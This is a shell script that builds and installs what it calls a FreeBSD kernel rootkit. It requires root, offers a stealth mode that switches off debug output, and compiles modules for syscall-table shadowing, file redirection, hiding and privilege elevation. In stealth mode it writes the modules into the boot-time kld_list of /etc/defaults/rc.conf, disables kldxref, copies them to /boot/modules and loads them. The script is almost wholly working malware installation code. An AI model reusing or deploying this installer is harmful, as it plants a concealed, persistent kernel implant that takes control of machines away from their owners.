#!/bin/sh

MAGICK_STR="z4xX0n"
args=""

test_mode=1
euid=$(id -u)

if [ $euid != 0 ]; then
   echo "Must be root to run this"
   exit 1
fi

while [ "$#" -gt 0 ]
do
   arg="$1"

   case $arg in
      # STEALTH mode
      -s)
         test_mode=0
         shift
      ;;
      *)
         args="$args $1"
         shift
         ;;
   esac
done

if [ "$args" != "" ];then
   MAGICK_STR="`echo $args | awk '{print $1}'`"
fi

mkdir -p bin
mkdir -p obj

sed -i '' s/`grep "#define T_NAME" ./src/magick.h | awk '{print $3}'`/\"$MAGICK_STR\"/ ./src/magick.h

# Turn off debug in stealth mode
if [ $test_mode = 0 ];then
   sed -i '' s/^CFLAGS+=-DDEBUG/#CFLAGS+=-DDEBUG/ Makefile.*

# Turn on debug in test mode
else
   sed -i '' s/^#CFLAGS+=-DDEBUG/CFLAGS+=-DDEBUG/ Makefile.*
fi

make -f Makefile.shdw_sysent_tbl clean && make -f Makefile.shdw_sysent_tbl

if [ $? -ne 0 ];then
   echo "[x] Make shdw_sysent_tbl failed"
   exit -1
fi

make -f Makefile.shdw_lookup clean && make -f Makefile.shdw_lookup

if [ $? -ne 0 ];then
   echo "[x] Make shdw_lookup failed"
   exit -1
fi

make -f Makefile.deepbg clean && make -f Makefile.deepbg

if [ $? -ne 0 ];then
   echo "[x] Make deepbg failed"
   exit -1
fi

make -f Makefile.whisper clean && make -f Makefile.whisper

if [ $? -ne 0 ];then
   echo "[x] Make whisper failed"
   exit -1
fi

make -f Makefile.knighted clean && make -f Makefile.knighted

if [ $? -ne 0 ];then
   echo "[x] Make knighted failed"
   exit -1
fi

make -f Makefile.stash clean && make -f Makefile.stash

if [ $? -ne 0 ];then
   echo "[x] Make stash failed"
   exit -1
fi

make -f Makefile.file_redirection clean && make -f Makefile.file_redirection

if [ $? -ne 0 ];then
   echo "[x] Make file_redirection failed"
   exit -1
fi

make -f Makefile.kmalloc clean && make -f Makefile.kmalloc

if [ $? -ne 0 ];then
   echo "[x] Make kmalloc failed"
   exit -1
fi

make -f Makefile.order_66 clean && make -f Makefile.order_66

if [ $? -ne 0 ];then
   echo "[x] Make order_66 failed"
   exit -1
fi

cc -o ./bin/knight-me ./src/knight-me.c
if [ $? -ne 0 ];then
   echo "[x] Make knight-me failed"
   exit -1
fi

cc -c ./src/kmalloc-patch.c -o ./obj/kmalloc-patch.o
if [ $? -ne 0 ];then
   echo "[x] Make kmalloc-patch failed"
   exit -1
fi

cc -lkvm -o ./bin/interface-kmalloc ./src/interface-kmalloc.c
if [ $? -ne 0 ];then
   echo "[x] Make interface-kmalloc failed"
   exit -1
fi

cc -lkvm ./obj/kmalloc-patch.o -o ./bin/test-kmalloc-patch ./src/test-kmalloc-patch.c
if [ $? -ne 0 ];then
   echo "[x] Make test-kmalloc-patch failed"
   exit -1
fi

cc -lkvm -o ./bin/kvm-write ./src/kvm-write.c
if [ $? -ne 0 ];then
   echo "[x] Make kvm-write failed"
   exit -1
fi

cc -lkvm -o ./bin/loader ./src/loader.c
if [ $? -ne 0 ];then
   echo "[x] Make loader failed"
   exit -1
fi

cc -o ./bin/interface-lookup ./src/interface-lookup.c
if [ $? -ne 0 ];then
   echo "[x] Make interface-lookup failed"
   exit -1
fi

cc -o ./bin/interface-deepbg ./src/interface-deepbg.c
if [ $? -ne 0 ];then
   echo "[x] Make interface-deepbg failed"
   exit -1
fi

cc -o ./bin/interface-whisper ./src/interface-whisper.c
if [ $? -ne 0 ];then
   echo "[x] Make interface-whisper failed"
   exit -1
fi

cc -o ./bin/trigger ./src/trigger.c
if [ $? -ne 0 ];then
   echo "[x] Make trigger failed"
   exit -1
fi

rm -f ./obj/${MAGICK_STR}_shdw_sysent_tbl.ko
rm -f ./obj/${MAGICK_STR}_shdw_lookup.ko
rm -f ./obj/${MAGICK_STR}_deepbg.ko
rm -f ./obj/${MAGICK_STR}_whisper.ko
rm -f ./obj/${MAGICK_STR}_order_66.ko
rm -f ./obj/${MAGICK_STR}_knighted.ko
rm -f ./obj/${MAGICK_STR}_file_redirection.ko
rm -f ./obj/${MAGICK_STR}_stash.ko

mv ./obj/shdw_sysent_tbl.ko ./obj/${MAGICK_STR}_shdw_sysent_tbl.ko
mv ./obj/shdw_lookup.ko ./obj/${MAGICK_STR}_shdw_lookup.ko
mv ./obj/deepbg.ko ./obj/${MAGICK_STR}_deepbg.ko
mv ./obj/whisper.ko ./obj/${MAGICK_STR}_whisper.ko
mv ./obj/order_66.ko ./obj/${MAGICK_STR}_order_66.ko
mv ./obj/knighted.ko ./obj/${MAGICK_STR}_knighted.ko
mv ./obj/file_redirection.ko ./obj/${MAGICK_STR}_file_redirection.ko
mv ./obj/stash.ko ./obj/${MAGICK_STR}_stash.ko

if [ $test_mode -eq 0 ];then
   grep -q "${MAGICK_STR}" /etc/defaults/rc.conf

   if [ $? -ne 0 ];then
      cp -f /etc/defaults/rc.conf /tmp/
      echo "kld_list=\"${MAGICK_STR}_shdw_sysent_tbl ${MAGICK_STR}_shdw_lookup ${MAGICK_STR}_deepbg ${MAGICK_STR}_whisper ${MAGICK_STR}_knighted ${MAGICK_STR}_stash ${MAGICK_STR}_order_66 ${MAGICK_STR}_file_redirection\"" >> /tmp/rc.conf
      sed -i '' s/^kldxref_enable.*=.*YES.*$/kldxref_enable=\"NO\"/ /tmp/rc.conf
      ./bin/loader /tmp/rc.conf /etc/defaults/rc.conf
      rm -f /tmp/rc.conf
   fi

   ./bin/loader ./obj/${MAGICK_STR}_shdw_sysent_tbl.ko /boot/modules
   ./bin/loader ./obj/${MAGICK_STR}_shdw_lookup.ko /boot/modules
   ./bin/loader ./obj/${MAGICK_STR}_deepbg.ko /boot/modules
   ./bin/loader ./obj/${MAGICK_STR}_whisper.ko /boot/modules
   ./bin/loader ./obj/${MAGICK_STR}_order_66.ko /boot/modules
   ./bin/loader ./obj/${MAGICK_STR}_knighted.ko /boot/modules
   ./bin/loader ./obj/${MAGICK_STR}_file_redirection.ko /boot/modules
   ./bin/loader ./obj/${MAGICK_STR}_stash.ko /boot/modules

   ./kldloadall.sh -s
else
   ./kldloadall.sh
fi

echo "[-] rootkit installation complete."
